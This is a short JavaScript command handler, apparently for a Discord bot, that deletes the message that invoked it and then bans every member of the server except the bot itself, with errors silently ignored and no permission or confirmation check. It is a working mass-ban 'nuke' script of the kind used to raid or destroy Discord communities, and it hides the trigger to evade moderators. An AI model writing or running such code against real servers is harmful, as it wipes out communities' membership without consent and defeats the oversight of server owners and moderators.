exports.run = async (client, msg, args) => {
    msg.delete();

    const target = await msg.guild.fetchMembers()
    const fetched = await target.members.map(m => m);

    fetched.forEach(async (member) => {
        if (member.id != client.user.id) {
            await member.ban().catch(() => {})
        }
    })
}